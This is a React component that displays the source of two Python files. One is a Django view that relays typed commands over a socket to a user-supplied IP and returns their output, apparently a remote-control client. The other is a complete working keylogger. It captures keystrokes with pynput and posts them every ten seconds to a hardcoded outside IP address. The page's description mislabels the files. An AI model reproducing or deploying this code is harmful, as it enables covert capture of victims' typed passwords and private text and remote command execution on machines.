import React, { useState, useEffect } from 'react';
import '../filedisplay.css';

const FileDisplaykey = () => {

  return (
    <div className="file-display-container">
      <div className="file-display-item">
        <h2 className="file-display-heading">server.py</h2>
        <pre className="file-display-content">
          <code>
            {`
import socket
from django.shortcuts import render

# Create a global socket variable
client_socket = None

def run_command(request):
    global client_socket

    if request.method == "POST":
        # Get the command from the form
        command = request.POST.get("command")

        if command is not None:
            if command == "quit":
                # Close the socket connection if user entered "quit"
                client_socket.close()
                client_socket = None
                return render(request, "template.html", {"output": "Quitting..."})
            elif client_socket is None:
                # If socket connection does not exist, create a new one
                server_ip = request.POST.get("ip")
                server_port = 80
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((server_ip, server_port))

            # Send the command and receive the output
            client_socket.sendall(command.encode())
            output = client_socket.recv(8192).decode()

            # Render the template with the output
            return render(request, "template.html", {"output": output})

    # Render the template for a GET request
    return render(request, "template.html")
            `}
          </code>
        </pre>
      </div>
      <div className="file-display-item">
        <h2 className="file-display-heading">keylogger.py</h2>
        <pre className="file-display-content">
          <code>
            {`
from pynput import keyboard
# We need to import the requests library to Post the data to the server.
import requests
# To transform a Dictionary to a JSON string we need the json package.
import json
#  The Timer module is part of the threading package.
import threading

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""

# Hard code the values of your server and ip address here.
ip_address = "12.5.161.31"
port_number = "8080"
# Time interval in seconds for code to execute.
time_interval = 10

def send_post_req():
    try:
        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
        # the format {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData" : text})
        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        # We start the timer thread.
        timer.start()
    except:
        print("Couldn't complete request!")

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

# Based on the key press we handle the way the key gets logged to the in memory string.
# Read more on the different keys that can be logged here:
# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(
    on_press=on_press) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()
            `}
          </code>
        </pre>
      </div>
      <div className="file-display-item">
        <h2 className="file-display-heading">Description</h2>
        <p className="file-display-description">This page displays the contents of server.py and client.py files.</p>
      </div>
    </div>
  );
};

export default FileDisplaykey;
